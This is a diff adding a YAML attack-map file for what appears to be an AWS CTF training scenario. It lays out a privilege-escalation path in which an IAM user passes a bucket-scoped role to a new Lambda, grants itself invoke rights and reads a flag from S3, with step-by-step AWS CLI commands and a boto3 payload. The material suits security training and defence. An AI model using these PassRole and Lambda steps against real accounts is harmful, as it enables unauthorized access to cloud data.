@@ -1,0 +1,131 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-006-to-bucket-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole on the target role, lambda:CreateFunction,
+        lambda:AddPermission, and lambda:InvokeFunction permissions. The starting user
+        has no direct S3 access to the target bucket — reaching the flag requires
+        delegating the bucket-scoped execution role to a Lambda function and invoking
+        it to read the flag on your behalf. Critically, creating the function is not
+        enough: you must also call lambda:AddPermission to grant yourself invocation
+        rights before the function can be executed.
+
+    - id: malicious-lambda
+      label: "Malicious Lambda"
+      type: resource
+      subType: lambda-function
+      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-lambda-006-to-bucket-escalation"
+      description: >
+        A Lambda function created by the attacker with the target role as its
+        execution role. The function code reads flag.txt from the target S3 bucket
+        and returns the contents in the invocation response. Before the function can
+        be invoked, the attacker must add a resource-based policy statement granting
+        themselves invocation rights via lambda:AddPermission.
+
+    - id: target-role
+      label: "Target Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-006-to-bucket-target-role"
+      description: >
+        This IAM role has s3:GetObject and s3:ListBucket permissions scoped to the
+        target S3 bucket. When used as a Lambda execution role, any code running in
+        the function can read objects from that bucket. The attacker leverages this
+        role to exfiltrate flag.txt through the Lambda invocation response without
+        ever holding direct S3 credentials themselves.
+
+    - id: target-bucket
+      label: "Target S3 Bucket"
+      type: resource
+      subType: s3-bucket
+      isTarget: true
+      arn: "arn:aws:s3:::pl-prod-lambda-006-to-bucket-{account_id}-{suffix}"
+      description: >
+        The target S3 bucket containing the CTF flag for this scenario. The flag
+        is stored as flag.txt inside the bucket. The starting user has no direct
+        S3 access — the path runs through the Lambda function executing under the
+        target role's credentials, which do have s3:GetObject on this bucket.
+
+  edges:
+    - from: starting-user
+      to: malicious-lambda
+      label: "iam:PassRole + lambda:CreateFunction"
+      description: >
+        The starting user creates a Lambda function, passing the target role as its
+        execution role. The function payload contains code to read flag.txt from the
+        target S3 bucket and return the contents in the response body.
+      hints:
+        - "Write a Lambda function payload that reads flag.txt from the target S3 bucket using boto3 and returns the contents in the response. Package it as a zip and create the function with the target role as its execution role via iam:PassRole. Creating the function does not grant you the right to invoke it — use lambda:AddPermission to add a resource-based policy statement granting your user lambda:InvokeFunction on the function. Wait for the function to reach Active state, then invoke it and extract the flag from the response body."
+        - "Browse to https://pathfinding.cloud/paths/lambda-006 for technique details."
+      commands:
+        - description: "Create the Lambda function payload that reads the flag from S3"
+          command: |
+            cat > /tmp/lambda_payload.py << 'EOF'
+            import boto3
+            import json
+            import os
+            def handler(event, context):
+                s3 = boto3.client('s3')
+                bucket = event.get('bucket')
+                obj = s3.get_object(Bucket=bucket, Key='flag.txt')
+                flag = obj['Body'].read().decode('utf-8')
+                return {'statusCode': 200, 'body': json.dumps({'flag': flag})}
+            EOF
+            zip /tmp/lambda_payload.zip /tmp/lambda_payload.py
+        - description: "Create the Lambda function with the target execution role"
+          command: "aws lambda create-function --function-name pl-lambda-006-to-bucket-escalation --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-006-to-bucket-target-role --handler lambda_payload.handler --zip-file fileb:///tmp/lambda_payload.zip --timeout 30"
+
+    - from: starting-user
+      to: malicious-lambda
+      label: "lambda:AddPermission"
+      description: >
+        The starting user adds a resource-based policy statement to the Lambda function,
+        granting themselves permission to invoke it. This step is required because IAM
+        permissions alone do not automatically grant invocation rights to the function
+        creator.
+      hints: []
+      commands:
+        - description: "Grant the starting user permission to invoke the Lambda function"
+          command: "aws lambda add-permission --function-name pl-lambda-006-to-bucket-escalation --statement-id AllowSelfInvoke --action lambda:InvokeFunction --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-006-to-bucket-starting-user"
+
+    - from: malicious-lambda
+      to: target-role
+      label: "lambda:InvokeFunction -> s3:GetObject"
+      description: >
+        The starting user invokes the Lambda function. The function executes under the
+        target role's credentials and calls s3:GetObject to read flag.txt from the
+        target bucket, returning the flag value in the invocation response body.
+      hints: []
+      commands:
+        - description: "Invoke the Lambda function to read the flag from S3"
+          command: "aws lambda invoke --function-name pl-lambda-006-to-bucket-escalation --payload '{\"bucket\": \"pl-prod-lambda-006-to-bucket-{account_id}-{suffix}\"}' /tmp/lambda_output.json && cat /tmp/lambda_output.json"
+
+    - from: target-role
+      to: target-bucket
+      label: "Read CTF flag"
+      description: >
+        The Lambda function executes as the target role and reads flag.txt from the
+        S3 bucket. The flag value is returned in the Lambda invocation response body
+        and can be extracted from /tmp/lambda_output.json. Alternatively, with the
+        target role's credentials from a successful invocation, the flag can be
+        retrieved directly from S3.
+      hints:
+        - "The flag is returned in the Lambda invocation response body. Parse the JSON output to extract it, or use the S3 credentials available through the execution role to fetch flag.txt directly."
+      commands:
+        - description: "Extract the flag from the Lambda response"
+          command: "cat /tmp/lambda_output.json | python3 -c \"import sys,json; r=json.load(sys.stdin); print(json.loads(r['body'])['flag'])\""
+        - description: "Alternatively, retrieve the flag directly from S3"
+          command: "aws s3 cp s3://pl-prod-lambda-006-to-bucket-{account_id}-{suffix}/flag.txt -"
